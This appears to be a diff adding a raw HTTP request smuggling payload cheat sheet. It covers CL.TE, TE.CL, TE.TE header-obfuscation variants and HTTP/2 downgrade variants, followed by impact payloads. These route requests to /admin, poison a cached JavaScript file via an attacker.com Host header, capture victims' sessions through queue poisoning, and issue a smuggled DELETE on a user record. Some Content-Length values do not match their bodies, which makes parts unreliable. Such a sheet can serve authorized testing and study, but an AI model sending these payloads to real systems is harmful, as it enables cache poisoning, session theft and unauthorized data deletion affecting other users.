@@ -1,0 +1,189 @@
+# HTTP Request Smuggling Payloads (Raw)
+
+In Repeater, set the request to raw (not auto-update CL). Use literal CRLF sequences.
+
+## CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
+
+### Detection — time-based (backend will parse second chunk as next request that sleeps)
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+a
+X
+```
+Second request arrives → should be treated as part of body "X" by backend, no error.
+
+Detection with sleep injection:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /sleep?cmd=sleep%2010 HTTP/1.1
+X: x
+```
+Wait 10s pattern → vulnerable.
+
+### Proof-of-smuggle (reflector)
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 90
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+Follow-up requests get `404` from smuggled GET → confirms.
+
+## TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length)
+
+### Detection — time-based
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
+### Reflected/smuggled prefix
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X: 
+```
+## TE.TE (one variant of Transfer-Encoding obfuscation wins)
+Try each:
+```
+Transfer-Encoding: chunked
+Transfer-Encoding:  chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-encoding: chunked
+Transfer-Encoding: chunked\r
+Transfer-Encoding:\tchunked
+Transfer-Encoding: chunked;foo=bar
+Transfer-Encoding: identity,chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: gzip, chunked
+Transfer-Encoding: chunkedx
+Transfer-Encoding:\r\n\r\nchunked
+```
+Each variant = a row where frontend optionally ignores, backend may honor.
+
+## H2.CL (front-end de-frames HTTP/2, back-end uses Content-Length)
+Within a single HTTP/2 request, smuggle an HTTP/1.1 request line in the body:
+```
+:method: POST
+:path: /
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+X:
+```
+Content-Length on HTTP/2 stream set to 0 while body has a smuggled `GET`.
+
+## H2.TE
+```
+:method: POST
+:path: /
+transfer-encoding: chunked
+
+0
+
+GET /smuggle HTTP/1.1
+Host: takeover.com
+```
+(backend sees TE and honors chunked.)
+
+## Common impact payloads
+
+### Access bypass (route to admin)
+CL.TE exploit that redirects the NEXT request to /admin as well:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 68
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+```
+
+### Cache poisoning (poison a public JS/CSS)
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 250
+Transfer-Encoding: chunked
+
+0
+
+GET /static/app.js HTTP/1.1
+Host: attacker.com
+Connection: close
+X-Ignore: X
+```
+If the back-end serves `attacker.com/static/app.js` path cached under `target.com` → cache poisoning.
+
+### Steal user request (queue poisoning)
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+GET /reflect-root HTTP/1.1
+X-Ignore: X
+```
+Victim traffic is stored; next request from victim → reflected into your response → session/CSRF steal.
+
+### Bypass front-end ACL → internal admin endpoints
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+DELETE /api/user/1 HTTP/1.1
+X: 
+```
+
+## Header-fix quirks to try
+- Remove `Host:` from smuggled request (back-end may use its own Host, or absolute URI)
+- Add `Connection: keep-alive` in smuggled header to keep socket open
+- Use absolute-form request targets: `GET http://target.com/admin HTTP/1.1`
+
+## Tools (non-exhaustive)
+- Burp `HTTP Request Smuggler` (best automated detector)
+- `smuggler.py` (defparam) — CLI detector of CL.TE/TE.CL/TE.TE
+- nuclei `-t http/request-smuggling`
+- `httpdesync` (for H2 attacks)
+
+## Warning
+Smuggling can poison shared caches and impact other users instantly. Confirm with a harmless reflector first, and only on authorized targets / dedicated labs.
